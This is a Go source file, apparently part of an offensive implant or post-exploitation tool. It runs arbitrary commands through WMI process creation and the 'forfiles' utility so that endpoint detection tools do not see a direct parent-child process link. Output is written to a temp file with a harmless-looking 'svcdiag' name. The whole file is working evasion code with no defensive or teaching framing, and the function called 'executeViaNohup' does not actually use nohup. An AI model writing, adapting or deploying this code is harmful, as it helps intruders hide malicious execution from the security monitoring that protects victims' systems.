package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// breakProcessTree executes commands through intermediate processes
// to avoid direct parent-child relationships that EDRs flag
func breakProcessTree(ctx context.Context, command string) (string, error) {
	if runtime.GOOS == "windows" {
		return executeViaWMI(ctx, command)
	}
	return executeViaNohup(ctx, command)
}

func executeViaWMI(ctx context.Context, command string) (string, error) {
	tmpFile := os.TempDir() + `\svcdiag_` + fmt.Sprintf("%d", os.Getpid()) + `.tmp`
	defer os.Remove(tmpFile)

	wmiCmd := fmt.Sprintf(`cmd /c "%s > %s 2>&1"`, command, tmpFile)
	wmiCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(wmiCtx, "wmic", "process", "call", "create", wmiCmd)
	err := cmd.Run()

	if err != nil {
		if ctx.Err() != nil {
			return "", fmt.Errorf("wmi: %w", ctx.Err())
		}
		return "", fmt.Errorf("wmi: %w", err)
	}

	for i := 0; i < 10; i++ {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		case <-time.After(500 * time.Millisecond):
		}
		if _, err := os.Stat(tmpFile); err == nil {
			break
		}
	}

	out, err := os.ReadFile(tmpFile)
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func executeViaNohup(ctx context.Context, command string) (string, error) {
	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func executeViaForfiles(ctx context.Context, command string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("forfiles only available on Windows")
	}
	forCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()
	cmd := exec.CommandContext(forCtx, "forfiles", "/P", `C:\Windows`,
		"/M", "notepad.exe", "/C", fmt.Sprintf(`cmd /c %s`, command))
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}
